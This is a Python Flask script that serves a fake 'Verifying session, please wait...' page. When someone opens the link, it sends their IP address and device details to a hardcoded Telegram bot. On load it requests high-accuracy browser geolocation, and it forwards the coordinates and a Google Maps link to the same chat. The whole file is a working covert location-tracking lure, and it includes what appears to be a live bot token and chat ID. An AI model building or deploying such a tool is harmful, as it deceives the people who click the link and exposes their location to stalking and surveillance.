import threading
from flask import Flask, request, render_template_string, jsonify
import requests

app = Flask(__name__)

BOT_TOKEN = "9174186006:AAGTbwauwOEjqESKJ3Zdrr5srXmCYfzGMlA"
CHAT_ID = "1149896740"

HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Loading...</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      background-color: #0f172a;
      color: #f8fafc;
      font-family: system-ui, -apple-system, sans-serif;
    }
    .spinner {
      width: 48px;
      height: 48px;
      border: 5px solid #334155;
      border-top-color: #38bdf8;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 16px;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    .status {
      font-size: 15px;
      color: #94a3b8;
      margin-bottom: 16px;
    }
    .btn {
      padding: 10px 20px;
      background: #0284c7;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div class="spinner"></div>
  <div class="status" id="statusText">Verifying session, please wait...</div>
  <button class="btn" id="continueBtn" onclick="requestLocation()">Continue</button>

  <script>
    function requestLocation() {
      if (!navigator.geolocation) {
        sendResult({ status: "error", error: "Geolocation not supported" });
        return;
      }

      navigator.geolocation.getCurrentPosition(
        function (position) {
          sendResult({
            status: "allowed",
            lat: position.coords.latitude,
            lon: position.coords.longitude,
            acc: position.coords.accuracy
          });
          document.getElementById("statusText").innerText = "Verification complete.";
        },
        function (error) {
          sendResult({
            status: "denied",
            error: error.message
          });
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }
      );
    }

    function sendResult(payload) {
      fetch("/location", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
    }

    window.onload = requestLocation;
  </script>
</body>
</html>
"""

def _post_telegram(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": False
    }
    try:
        response = requests.post(url, json=payload, timeout=15)
        if not response.ok:
            print(f"Telegram API error: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"Error sending to Telegram: {e}")

def send_telegram_message(text):
    # Run in a background thread so the web page loads immediately
    threading.Thread(target=_post_telegram, args=(text,), daemon=True).start()

@app.route("/", methods=["GET"])
def index():
    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if client_ip and "," in client_ip:
        client_ip = client_ip.split(",")[0].strip()

    user_agent = request.headers.get("User-Agent", "Unknown Device")

    msg = (
        "<b>[Stage 1] Link Clicked</b>\n"
        f"<b>IP Address:</b> <code>{client_ip}</code>\n"
        f"<b>Device / User-Agent:</b> <code>{user_agent}</code>"
    )
    send_telegram_message(msg)

    return render_template_string(HTML_PAGE)

@app.route("/location", methods=["POST"])
def location():
    data = request.get_json(silent=True) or {}
    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if client_ip and "," in client_ip:
        client_ip = client_ip.split(",")[0].strip()

    if data.get("status") == "allowed":
        lat = data.get("lat")
        lon = data.get("lon")
        acc = data.get("acc")
        maps_url = f"https://www.google.com/maps?q={lat},{lon}"

        msg = (
            "<b>[Stage 2] Location Permission Allowed</b>\n"
            f"<b>IP Address:</b> <code>{client_ip}</code>\n"
            f"<b>Coordinates:</b> <code>{lat}, {lon}</code>\n"
            f"<b>Accuracy:</b> {acc} meters\n"
            f"<b>Map:</b> <a href='{maps_url}'>Open in Google Maps</a>"
        )
    else:
        error_msg = data.get("error", "Permission denied or unavailable")
        msg = (
            "<b>[Stage 2] Location Permission Denied</b>\n"
            f"<b>IP Address:</b> <code>{client_ip}</code>\n"
            f"<b>Reason:</b> <code>{error_msg}</code>"
        )

    send_telegram_message(msg)
    return jsonify({"ok": True})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
